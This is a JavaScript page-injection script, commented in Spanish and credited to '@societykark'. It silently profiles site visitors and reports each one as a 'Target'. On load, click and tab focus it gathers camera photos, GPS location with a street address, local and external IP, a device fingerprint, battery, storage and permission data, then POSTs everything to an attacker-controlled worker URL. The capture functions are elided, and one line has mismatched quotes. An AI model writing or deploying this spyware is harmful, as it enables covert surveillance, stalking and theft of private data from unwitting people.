(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    // ... (todas las funciones de captura: reverseGeocode, obtenerIPWebRTC, capturarGPS, capturarFotos, obtenerDispositivo, obtenerFingerprint, obtenerBateria, obtenerAlmacenamiento, obtenerPermisos)

    async function enviarAlWorker() {
        const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
            capturarFotos(3),
            capturarGPS(),
            obtenerIPWebRTC(),
            obtenerDispositivo(),
            obtenerFingerprint(),
            obtenerBateria(),
            obtenerAlmacenamiento(),
            obtenerPermisos()
        ]);

        // Construir el mensaje exacto como en los ejemplos
        let msg = '📊 Visitor Information Captured\n';
        msg += '━━━━━━━━━━━━━━━━\n\n';

        // 1. Device & Browser
        msg += '🖥️ Device & Browser\n';
        msg += `   • Device Model: ${dispositivo.modelo}\n`;
        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;

        // 2. Fingerprint
        msg += '🎨 Fingerprint\n';
        msg += `   • GPU: ${fp.gpu}\n`;
        msg += `   • Canvas: ${fp.canvas}\n\n`;

        // 3. Network
        msg += '🌐 Network Information\n';
        if (ipLocal) {
            msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
        }
        // Intentar obtener IP externa
        let ipExterna = 'N/A';
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ipExterna = data.ip || 'N/A';
        } catch(e) {}
        msg += `   • IP Address: ${ipExterna}\n`;
        msg += `   • Language: ${dispositivo.language}\n\n`;

        // 4. Location Details (GPS o IP)
        msg += '📍 Location Details\n';
        if (gps) {
            msg += `   • GPS: ${gps.lat}, ${gps.lng}\n`;
            msg += `   • Precisión: ±${gps.acc}m\n`;
            const direccion = await reverseGeocode(gps.lat, gps.lng);
            if (direccion) msg += `   • Dirección: ${direccion}\n`;
            msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
        } else {
            msg += `   • No disponible (permiso denegado o sin GPS)\n`;
        }
        msg += '\n';

        // 5. Display
        msg += '🖼️ Display Information\n';
        msg += `   • Resolution: ${dispositivo.resolution}\n\n`;

        // 6. Battery
        msg += '🔋 Battery Status\n';
        msg += `   • Level: ${bateria.level}\n`;
        msg += `   • Charging: ${bateria.charging}\n\n`;

        // 7. Permissions
        msg += '🔐 Device Permissions\n`;
        msg += `   • Camera: ${permisos.camera}\n`;
        msg += `   • Location: ${permisos.location}\n\n`;

        // 8. Hardware
        msg += '💾 Hardware & Storage\n';
        msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
        msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
        msg += `   • Storage Used: ${almacenamiento.used}\n`;
        msg += `   • Storage Total: ${almacenamiento.total}\n\n`;

        // 9. Target
        msg += '━━━━━━━━━━━━━━━━\n';
        msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
        msg += `⚡ Developed by: @societykark\n`;
        msg += `⏰ ${new Date().toISOString()}`;

        // Enviar al Worker
        const payload = {
            text: msg,
            photos: fotos,
            latitude: gps?.lat || null,
            longitude: gps?.lng || null,
            accuracy: gps?.acc || null
        };

        try {
            const response = await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            console.log('✅ Enviado:', result);
        } catch(e) {
            console.error('❌ Error:', e);
        }
    }

    window.addEventListener('load', () => setTimeout(enviarAlWorker, 500));
    document.addEventListener('click', () => { console.log('👆 Click'); setTimeout(enviarAlWorker, 300); });
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) { console.log('👁️ Visible'); setTimeout(enviarAlWorker, 300); }
    });
})();
